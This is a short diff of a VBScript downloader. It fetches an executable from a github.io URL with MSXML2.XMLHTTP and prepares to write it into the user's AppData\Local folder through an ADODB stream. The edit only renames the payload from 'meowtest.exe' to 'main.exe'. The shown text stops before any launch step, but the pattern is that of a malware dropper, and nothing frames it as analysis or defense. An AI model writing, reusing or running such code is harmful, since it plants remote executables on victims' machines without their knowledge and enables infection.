@@ -1,10 +1,10 @@
 Set x = CreateObject("MSXML2.XMLHTTP")
-x.Open "GET", "https://homleds.github.io/meowtest.exe", False
+x.Open "GET", "https://homleds.github.io/main.exe", False
 x.Send
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 appDataFolder = "C:\Users\" & CreateObject("WScript.Network").UserName & "\AppData\Local"
-tempFile = appDataFolder & "\meowtest.exe"
+tempFile = appDataFolder & "\main.exe"
 
 Set stream = CreateObject("ADODB.Stream")
 stream.Type = 1
